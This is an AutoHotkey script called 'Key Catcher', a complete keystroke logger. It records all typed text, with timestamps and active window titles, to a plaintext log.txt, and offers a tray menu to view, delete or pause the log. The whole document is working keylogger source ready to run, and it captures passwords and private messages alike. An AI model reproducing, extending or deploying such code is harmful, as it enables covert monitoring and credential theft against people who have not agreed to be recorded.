;Copyright 2010-2011 Daniel Green, v1.00.3b modified 1/14/11 3:28am

;Key Catcher is free for both business and personal use. It can be freely modified and redistributed providing that, 1. all notices remain intact, 2. you acknowledge where it originally came from, 3. it is only used for legal and ethical purposes, 4. no profit is derived from its distribution.

#noenv
#singleinstance, ignore
setbatchlines, -1
setworkingdir, %a_scriptdir%
process, priority, ,high
coordmode, tooltip, screen

menu, tray, Icon, icons\main.ico, , 1
menu, tray, nostandard
menu, tray, tip, Logging Active
menu, tray, add, View Log, view
menu, tray, add, Delete Log, delete
menu, tray, add, About, about
menu, tray, add
menu, tray, add, Disable, suspend
menu, tray, add
menu, tray, add, Exit, exit

settimer, mem, 1200000, 0

blank=
endkey=,{enter}{tab}{LControl}{RControl}{LAlt}{LWin}{RWin}{AppsKey}{F1}{F2}{F3}{F4}{F5}{F6}{F7}{F8}{F9}{F10}{F11}{F12}{Left}{Right}{Up}{Down}{Home}{End}{PgUp}{PgDn}{Del}{Ins}{BS}{Capslock}{Numlock}{PrintScreen}{Pause}
match=.,?,!

;MM Input in windows containing these strings will not be logged
windowblacklist=onenote,excel
loop
{
	key=
	emptymem()
	
; characters.
	WinGetActiveTitle, wintitle
	if wintitle not contains %windowblacklist%
	{
		input, text, i m v *, %endkey%, %match%
	
		if errorlevel=Match
		{
			key=%blank%
		}
		
		else if errorlevel=NewInput
		{
			key={Click}
		}
		
		else
		{
			stringtrimleft, key, errorlevel, 7
			key={%key%}
		}
		
		key=%key%
		text=%text%
		
		StringLen, length, text
		if length > 2
		{
			WinGetActiveTitle, wintitle
			
			if wintitle not contains %windowblacklist%
			{
				ifnotequal wintitle, %wintitleold%
				{
					fileappend, `n%wintitle%`n, log.txt
					wintitleold = %wintitle%
				}
				
				stringreplace, text, text, , %blank%
				time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
				fileappend, %time%%A_Tab%%text%%A_Tab%%key%`n, log.txt
			}
		}
	}
}

;MM Terminate input when mouse is used:
~LButton::
~RButton::
~MButton::
Input
return

write:
{
	time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
	fileappend, %time% - %content%`n, log.txt
	emptymem()
}
return

view:
{
	fileinstall, log.txt, log.txt, 0
	runwait, log.txt
	emptymem()
}
return

delete:
{
	ifexist, log.txt
	{
		msgbox, 33, Confirm Delete, Delete log?

		ifmsgbox, ok
		{
			filerecycle, log.txt
			msgbox, 64, Log Deleted, The log file has been sent to the Recycle Bin., 5
			emptymem()
			return
		}
		else
		{
			emptymem()
			return
		}
	}

	ifnotexist, log.txt
	{
		msgbox, 64, Cannot Delete Log, Cannot delete log file because it does not exist., 5
		emptymem()
		return
	}
}
return

about:
{
	fileinstall, readme.txt, readme.txt, 0
	runwait, readme.txt
	emptymem()
}
return

suspend:
{
	if a_issuspended = 0
	{
		menu, tray, tip, Logging Suspended
		menu, tray, rename, Disable, Enable
		; menu, tray, icon, icons\suspend.ico, , 1
		ToolTip, Logging Suspended, 2000, 750
		suspend, on
		pause, on
		emptymem()
	}
	else
	{
		menu, tray, tip, Logging Active
		suspend, off
		pause, off
		ToolTip
		menu, tray, rename, Enable, Disable
		; menu, tray, icon, icons\main.ico, , 1
		emptymem()
	}
}
return

exit:
{
	exitapp
}
return

mem:
{
	emptymem()
}
return

emptymem()
{
	return, dllcall("psapi.dll\EmptyWorkingSet", "UInt", -1)
}